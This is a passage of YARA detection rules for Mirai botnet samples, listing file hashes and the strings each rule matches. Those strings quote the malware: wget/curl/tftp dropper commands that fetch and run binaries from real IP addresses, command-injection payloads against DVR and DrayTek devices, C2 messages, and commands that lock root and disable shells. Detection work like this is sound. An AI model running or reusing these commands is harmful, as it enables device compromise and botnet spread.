      $s13 = "wabjtam" fullword ascii /* score: '8.00'*/
      $s14 = "hikvision" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__a44e620b_Mirai_signature__a88b0d64_Mirai_signature__aaf116bd_Mirai_signature__ab2db846_Mirai_signature__ae_16 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_a44e620b.elf, Mirai(signature)_a88b0d64.elf, Mirai(signature)_aaf116bd.elf, Mirai(signature)_ab2db846.elf, Mirai(signature)_aecdc839.elf, Mirai(signature)_aefc54f8.elf, Mirai(signature)_afda3b08.elf, Mirai(signature)_b1638cd8.elf, Mirai(signature)_b38aa52f.elf, Mirai(signature)_b5f67a3c.elf, Mirai(signature)_c2ef6900.elf, Mirai(signature)_c5c07910.elf, Mirai(signature)_cdb9c317.elf, Mirai(signature)_d3f45802.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a44e620b1d09c269dc06ead50f046869fc616c6b68ba36078d10580db148f4f7"
      hash2 = "a88b0d645ce54fa7fbfdc7ece168e076e29414424f6c8ee8379cb1a78b59d3cd"
      hash3 = "aaf116bd2079f72db4485475b16733a916a2e5f5d16abc31e4ab3ff58cdd302d"
      hash4 = "ab2db84620ee02c0d80cd6a07ae136e47c671aed76249f9512127c9858e63465"
      hash5 = "aecdc8395acf850f4c17caa1a0c10db68a678fd19349a780d00fb22362dd285b"
      hash6 = "aefc54f8202f34d24d309cb7a2e6c9cfe70b07f5f8ed4ba0835ca3b531e4896e"
      hash7 = "afda3b0865fe633cce50a9e11af441aeb5f66079c3f821607a6c7f6299ee5c5e"
      hash8 = "b1638cd84f939afe8540f7f41bd47a6849a9bc4b766858da9f666c84db292d2b"
      hash9 = "b38aa52f599db822b5be6767789a85c2705fc38b212e9064bffd5464a7e3999d"
      hash10 = "b5f67a3c17ca0537184768278c53a7a588c8086327b8584c2dadd20a09febcc4"
      hash11 = "c2ef6900c833b39f18d6d8187bb763ce6e06f287f7e9a6cdf9ca9ba0f36139d4"
      hash12 = "c5c07910257a4d13fe270d7b99b8de8d291c5e7586246cd3b1061a5511b3555e"
      hash13 = "cdb9c317ae9c447f64020b0943c0522ddaa003b17851f44a8ab8f9a92e561ca3"
      hash14 = "d3f45802d4e27822160ba137c53811b292451fdcd676ac895787614d61d80edd"
   strings:
      $s1 = "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9" fullword ascii /* score: '12.00'*/
      $s3 = "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s4 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" fullword ascii /* score: '12.00'*/
      $s5 = "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.1024" ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/5" ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s12 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s13 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/5" ascii /* score: '9.00'*/
      $s14 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s15 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b53d4781_Mirai_signature__cb4a3665_Mirai_signature__d392be4c_Mirai_signature__d3d7315e_Mirai_signature__d8_17 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b53d4781.elf, Mirai(signature)_cb4a3665.elf, Mirai(signature)_d392be4c.elf, Mirai(signature)_d3d7315e.elf, Mirai(signature)_d8018e31.elf, Mirai(signature)_de5fb680.elf, Mirai(signature)_dfd83036.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b53d4781bbadb17014da280e274e11f2de9063a35f2eabd32d4596707b147306"
      hash2 = "cb4a3665ebd12bdb094b9fc188793c67ec3008363a49b1dde00d488b54df984b"
      hash3 = "d392be4c88e746a9b0952c4d250d330e5354b35dc7857fe72d04e95228d9c420"
      hash4 = "d3d7315e0dee9584317e7a5bfc266b4b265e389971e15b54f3d588ea5bb328b7"
      hash5 = "d8018e31b77b135ed300a988757f409347d013b76f9c9a4972e48cb715f45967"
      hash6 = "de5fb68023465cb5d8ace412e11032d98a41bd6af2a83245c046020530130496"
      hash7 = "dfd830368724f6abcc542bc8b85e3d5fa2aedf8282d3805d0d6d53f45c7e0937"
   strings:
      $s1 = "gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s2 = "gethostbyname_r.c" fullword ascii /* score: '14.00'*/
      $s3 = "__GI_gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s4 = "get_hosts_byname_r.c" fullword ascii /* score: '14.00'*/
      $s5 = "__get_hosts_byname_r" fullword ascii /* score: '14.00'*/
      $s6 = "read_etc_hosts_r.c" fullword ascii /* score: '12.00'*/
      $s7 = "__read_etc_hosts_r" fullword ascii /* score: '12.00'*/
      $s8 = "decoded.c" fullword ascii /* score: '11.00'*/
      $s9 = "__decode_header" fullword ascii /* score: '11.00'*/
      $s10 = "__encode_header" fullword ascii /* score: '9.00'*/
      $s11 = "encoded.c" fullword ascii /* score: '9.00'*/
      $s12 = "__open_etc_hosts" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b5432303_Mirai_signature__d31e8855_Mirai_signature__ded92df2_18 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b5432303.elf, Mirai(signature)_d31e8855.elf, Mirai(signature)_ded92df2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b54323035aa1ff2acc01fc8b5620504b6c15f1aaa7ffe2daf813449ddd420ee2"
      hash2 = "d31e8855bd0463e79991a7f445de36062fb457d4f1fd2f04a0e47d9873a23f7c"
      hash3 = "ded92df2f33efea20f9ecfc7ae7f0cd3552403ca1bd226acce208b116ab361ec"
   strings:
      $s1 = "/tmp/bot_debug.log" fullword ascii /* score: '19.00'*/
      $s2 = "Attempting to copy executable" fullword ascii /* score: '19.00'*/
      $s3 = "Failed to copy executable" fullword ascii /* score: '15.00'*/
      $s4 = "# System service" fullword ascii /* score: '14.00'*/
      $s5 = "Failed to create autostart script" fullword ascii /* score: '13.00'*/
      $s6 = "Failed to get current path" fullword ascii /* score: '12.00'*/
      $s7 = "Successfully copied executable" fullword ascii /* score: '12.00'*/
      $s8 = "Creating autostart script" fullword ascii /* score: '10.00'*/
      $s9 = "Created startup script" fullword ascii /* score: '10.00'*/
      $s10 = " > /dev/null 2>&1 &" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__ce3e8c21_Mirai_signature__db891fea_Mirai_signature__e002b1f4_19 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_ce3e8c21.elf, Mirai(signature)_db891fea.elf, Mirai(signature)_e002b1f4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ce3e8c212b0e1ec16377f94bcd0fe2870ed6944751e86d7798e57d744530fd7e"
      hash2 = "db891fead0dedaeb3b9a39522eda5f9b5781536b22ab34fed5ad2cb6d19d4e35"
      hash3 = "e002b1f45960b190d90ceb17cc7c5eb960075d7895508dc1204f793cb2115400"
   strings:
      $s1 = "[huawei] FD%d exploit_stage=2. sending POST /ctrlt/DeviceUpgrade_1 to %d.%d.%d.%d" fullword ascii /* score: '20.00'*/
      $s2 = "[main] Failed to connect to fd_ctrl to request process termination" fullword ascii /* score: '18.00'*/
      $s3 = "[huawei] scanner process initiated. starting scanner" fullword ascii /* score: '16.00'*/
      $s4 = "[killer] Finding and killing processes holding port %d" fullword ascii /* score: '15.00'*/
      $s5 = "[main] We are the only process on this system!" fullword ascii /* score: '15.00'*/
      $s6 = "[huawei] FD%d exploit_stage=1. connection to %d.%d.%d.%d successful. proceeding to stage 2" fullword ascii /* score: '14.00'*/
      $s7 = "[main]: lost connection with CNC (errno: %d, stat: 1)" fullword ascii /* score: '12.50'*/
      $s8 = "[main] Lost connection with CNC (errno: %d, stat: 2)" fullword ascii /* score: '12.50'*/
      $s9 = "[main] Lost connection with CNC (errno: %d, stat: 1)" fullword ascii /* score: '12.50'*/
      $s10 = "[main]: Lost connection with CNC (errno: %d, stat: 2)" fullword ascii /* score: '12.50'*/
      $s11 = "[huawei] FD%d exploit_stage=3. closing connection" fullword ascii /* score: '11.00'*/
      $s12 = "[main] Attempting to connect to CNC" fullword ascii /* score: '11.00'*/
      $s13 = "Failed to find inode for port %d" fullword ascii /* score: '10.00'*/
      $s14 = "[killer] Found pid %d for port %d" fullword ascii /* score: '10.00'*/
      $s15 = "Found inode \"%s\" for port %d" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__a44e620b_Mirai_signature__a88b0d64_Mirai_signature__aaf116bd_Mirai_signature__ab2db846_Mirai_signature__ad_20 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_a44e620b.elf, Mirai(signature)_a88b0d64.elf, Mirai(signature)_aaf116bd.elf, Mirai(signature)_ab2db846.elf, Mirai(signature)_ad4b5731.elf, Mirai(signature)_aecdc839.elf, Mirai(signature)_aefc54f8.elf, Mirai(signature)_af1edee4.elf, Mirai(signature)_afda3b08.elf, Mirai(signature)_b1638cd8.elf, Mirai(signature)_b38aa52f.elf, Mirai(signature)_b5f67a3c.elf, Mirai(signature)_c2ef6900.elf, Mirai(signature)_c5c07910.elf, Mirai(signature)_cdb9c317.elf, Mirai(signature)_d3f45802.elf, Mirai(signature)_d4bd1057.elf, Mirai(signature)_dd9be62c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a44e620b1d09c269dc06ead50f046869fc616c6b68ba36078d10580db148f4f7"
      hash2 = "a88b0d645ce54fa7fbfdc7ece168e076e29414424f6c8ee8379cb1a78b59d3cd"
      hash3 = "aaf116bd2079f72db4485475b16733a916a2e5f5d16abc31e4ab3ff58cdd302d"
      hash4 = "ab2db84620ee02c0d80cd6a07ae136e47c671aed76249f9512127c9858e63465"
      hash5 = "ad4b57314b3edbc20267b3fb36100f684bedaa77f593dbf90904b900307dbced"
      hash6 = "aecdc8395acf850f4c17caa1a0c10db68a678fd19349a780d00fb22362dd285b"
      hash7 = "aefc54f8202f34d24d309cb7a2e6c9cfe70b07f5f8ed4ba0835ca3b531e4896e"
      hash8 = "af1edee490d3758f493a30669bc8cca7ae0c23d6584b77997676857632b8b388"
      hash9 = "afda3b0865fe633cce50a9e11af441aeb5f66079c3f821607a6c7f6299ee5c5e"
      hash10 = "b1638cd84f939afe8540f7f41bd47a6849a9bc4b766858da9f666c84db292d2b"
      hash11 = "b38aa52f599db822b5be6767789a85c2705fc38b212e9064bffd5464a7e3999d"
      hash12 = "b5f67a3c17ca0537184768278c53a7a588c8086327b8584c2dadd20a09febcc4"
      hash13 = "c2ef6900c833b39f18d6d8187bb763ce6e06f287f7e9a6cdf9ca9ba0f36139d4"
      hash14 = "c5c07910257a4d13fe270d7b99b8de8d291c5e7586246cd3b1061a5511b3555e"
      hash15 = "cdb9c317ae9c447f64020b0943c0522ddaa003b17851f44a8ab8f9a92e561ca3"
      hash16 = "d3f45802d4e27822160ba137c53811b292451fdcd676ac895787614d61d80edd"
      hash17 = "d4bd1057c9899fb480b0e283afbec8de9563b8c766bd1db10e4b0685e360c953"
      hash18 = "dd9be62c107510987a7de2ad9dbfc6760fee5f63d6d761888066a5378ffed8e6"
   strings:
      $s1 = "cd %s && tftp -g -r %s %s" fullword ascii /* score: '23.00'*/
      $s2 = "ftpget -v -u anonymous -p anonymous -P 21 %s %s %s" fullword ascii /* score: '20.00'*/
      $s3 = "tftp %s -c get %s %s" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://%s/%s/%s -O %s" fullword ascii /* score: '19.00'*/
      $s5 = "curl -o %s http://%s/%s/%s" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/sbin/tftp" fullword ascii /* score: '12.00'*/
      $s7 = "/usr/sbin/wget" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/sbin/ftpget" fullword ascii /* score: '12.00'*/
      $s9 = "/usr/bin/ftpget" fullword ascii /* score: '9.00'*/
      $s10 = "/usr/bin/tftp" fullword ascii /* score: '9.00'*/
      $s11 = "/usr/bin/wget" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__a99601f4_Mirai_signature__b65f040a_Mirai_signature__d29dccab_Mirai_signature__d4b30e4f_Mirai_signature__d8_21 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_a99601f4.elf, Mirai(signature)_b65f040a.elf, Mirai(signature)_d29dccab.elf, Mirai(signature)_d4b30e4f.elf, Mirai(signature)_d8e38b21.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a99601f47504decf8c1fb96c233bd51994eb4b35a9b1bc08af998570b3130e01"
      hash2 = "b65f040a3b87b12ad0b1565d38f0e3a0efd2ed859ea6f5a2db1ab61c6e88cf26"
      hash3 = "d29dccab4b0c5597d8d70efc60a3e14e6868a2175b6366a0f8ccfe0a790d65ce"
      hash4 = "d4b30e4f367331a4b3713ab0416042c28786df4a03b0e44c45d732b8ace37265"
      hash5 = "d8e38b2119ddb78df4dbc14a75b966fc07cf869a6faa342077253f255a1a7bb2"
   strings:
      $s1 = "[DEBUG] lock_device: Failed to create /etc/nologin" fullword ascii /* score: '22.00'*/
      $s2 = "[DEBUG] lock_device: Failed to write message to /etc/nologin" fullword ascii /* score: '22.00'*/
      $s3 = "echo 'Device locked by admin.' > /etc/nologin" fullword ascii /* score: '19.00'*/
      $s4 = "[DEBUG] lock_device: /etc/nologin created" fullword ascii /* score: '19.00'*/
      $s5 = "touch /etc/nologin" fullword ascii /* score: '19.00'*/
      $s6 = "[DEBUG] lock_device: Message written to /etc/nologin" fullword ascii /* score: '19.00'*/
      $s7 = "passwd -l root" fullword ascii /* score: '18.00'*/
      $s8 = "[DEBUG] lock_device: Failed to lock root account" fullword ascii /* score: '13.00'*/
      $s9 = "[DEBUG] lock_device: chmod /bin/bash result: %d" fullword ascii /* score: '11.00'*/
      $s10 = "chmod 000 /bin/bash" fullword ascii /* score: '11.00'*/
      $s11 = "[DEBUG] lock_device: chmod /bin/busybox result: %d" fullword ascii /* score: '11.00'*/
      $s12 = "chmod 000 /bin/sh" fullword ascii /* score: '11.00'*/
      $s13 = "[DEBUG] lock_device: chmod /bin/sh result: %d" fullword ascii /* score: '11.00'*/
      $s14 = "chmod 000 /bin/busybox" fullword ascii /* score: '11.00'*/
      $s15 = "[DEBUG] lock_device: Root account locked" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__a0c8570d_Mirai_signature__a6a3fd1a_Mirai_signature__b27aad23_Mirai_signature__d71825d1_22 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_a0c8570d.sh, Mirai(signature)_a6a3fd1a.sh, Mirai(signature)_b27aad23.sh, Mirai(signature)_d71825d1.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a0c8570dde73fc647c8a7d6cb0b1ac0585ec065b01c91223402e91844a1fea5c"
      hash2 = "a6a3fd1ae2ad5224205d5b3b349a7593c588b4a9355a39eec6756d6066a40c06"
      hash3 = "b27aad23252de85b0566d31285765769f3e0d8c9a0e489e07bf9e6b8c971c0f9"
      hash4 = "d71825d1cc73dbcc582f0b75e00b9f3457217b421dd503ed7bfd4643d68cac58"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.ppc; curl -O http://38.162.114.77/bin" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.x86_64; curl -O http://38.162.114.77/" ascii /* score: '27.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.m68k; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.arm6; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.arm7; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.mips; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.i468; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.i686; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.mpsl; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.arm5; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.sh4; curl -O http://38.162.114.77/bin" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.ppc440fp; curl -O http://38.162.114.7" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.x86; curl -O http://38.162.114.77/bin" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.arm4; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x2123 and filesize < 8KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b2a40c07_Mirai_signature__c06c4b11_Mirai_signature__c3b79660_23 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b2a40c07.elf, Mirai(signature)_c06c4b11.elf, Mirai(signature)_c3b79660.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b2a40c075d086ee909f1fd2f3b5e00e10a84d35ec00da75fa471111fe1c1dcc6"
      hash2 = "c06c4b11cbeebc756fe0403de3b6121238b199fa9c271b56821fb1386c445752"
      hash3 = "c3b79660b0ab77f3d852d86e1a6c3792da90ceb311bf4851d1777977d540994f"
   strings:
      $s1 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><types><filterTyp" ascii /* score: '29.00'*/
      $s2 = "GET /cgi-bin/mainfunction.cgi/apmcfgupload?session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0" fullword ascii /* score: '24.00'*/
      $s3 = "dressType type=\"addressType\"/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(wget${IFS}http://%d.%d." ascii /* score: '18.00'*/
      $s4 = "%%52$c%%52$cwget${IFS}http://%d.%d.%d.%d/router.draytek.rep.sh${IFS}-O-|sh HTTP/1.0" fullword ascii /* score: '18.00'*/
      $s5 = "POST /editBlackAndWhiteList HTTP/1.0" fullword ascii /* score: '16.00'*/
      $s6 = ".%d/dvr.tvt.rep.sh${IFS}-O-|sh)</ip></item></filterList></content></request>" fullword ascii /* score: '15.00'*/
      $s7 = "Host: %d.%d.%d.%d" fullword ascii /* score: '12.00'*/
      $s8 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><types><filterTyp" ascii /* score: '10.00'*/
      $s9 = "Content-Length: 1024" fullword ascii /* score: '9.00'*/
      $s10 = "</types><content><switch>true</switch><filterType type=\"filterTypeMode\">refuse</filterType><filterList type=\"list\"><itemType" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( 8 of them )
}

rule _Mirai_signature__bce528f7_Mirai_signature__c0d9224a_Mirai_signature__d3316ac5_24 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_bce528f7.sh, Mirai(signature)_c0d9224a.sh, Mirai(signature)_d3316ac5.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bce528f755f40d7b658b3429b4261913ee967a08eb3cdcc0318a1e6b712a4ef3"
      hash2 = "c0d9224a5b4fcc8239fff33348677e65de9d169de22b7c59148da412af7ef216"
      hash3 = "d3316ac59e69d8c77f4fd96521f9d76242ca8cdffc219891fddcb721319aad78"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://139.177.197.168/arm5 ; chmod 777 arm5 ; ./" ascii /* score: '27.00'*/
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://139.177.197.168/arm4 ; chmod 777 arm4 ; ./" ascii /* score: '27.00'*/
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://139.177.197.168/arm6 ; chmod 777 arm6 ; ./" ascii /* score: '27.00'*/
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm7 ; /bin/busybox wget http://139.177.197.168/arm7 ; chmod 777 arm7 ; ./" ascii /* score: '27.00'*/
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; /bin/busybox wget http://139.177.197.168/ppc ; chmod 777 ppc ; ./ppc" ascii /* score: '27.00'*/
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86_64 ; /bin/busybox wget http://139.177.197.168/x86_64 ; chmod 777 x86_6" ascii /* score: '27.00'*/
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; /bin/busybox wget http://139.177.197.168/mpsl ; chmod 777 mpsl ; ./" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; /bin/busybox wget http://139.177.197.168/spc ; chmod 777 spc ; ./spc" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86 ; /bin/busybox wget http://139.177.197.168/x86 ; chmod 777 x86 ; ./x86" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; /bin/busybox wget http://139.177.197.168/mips ; chmod 777 mips ; ./" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf m68k ; /bin/busybox wget http://139.177.197.168/m68k ; chmod 777 m68k ; ./" ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x6463 and filesize < 4KB and ( 8 of them )
      ) or ( all of them )
}

